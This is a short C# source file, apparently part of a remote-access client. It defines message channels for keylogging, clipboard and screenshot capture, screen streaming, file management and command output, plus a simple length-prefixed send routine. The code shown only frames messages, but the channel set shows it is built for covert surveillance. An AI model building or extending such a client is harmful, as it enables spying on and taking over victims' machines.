

namespace Client.Conexion
{
    public enum Channel : byte
    {
        Main = 0, // Canal principal para comandos y respuestas
        Keylogger = 1,
        ActiveWindow = 2,
        Clipboard = 3,
        Screenshot = 4,
        Streaming = 5,
        File = 6,
        SystemInfo = 7, 
        CommandOutput = 8,
        FileManager = 9,
        ServerFileUpload = 10,
        KeyExchange = 11

    }
    public static class Protocol
    {

        /// <summary>
        /// Antepone 1 byte de canal + 4 bytes de longitud al payload
        /// y lo envía por el stream.
        /// </summary>
        public static void Send(System.Net.Sockets.NetworkStream stream, Channel ch, byte[] payload)
        {
            byte[] header = new byte[5];
            header[0] = (byte)ch;
            Array.Copy(BitConverter.GetBytes(payload.Length), 0, header, 1, 4);
            stream.Write(header, 0, header.Length);
            stream.Write(payload, 0, payload.Length);
        }
    }
}
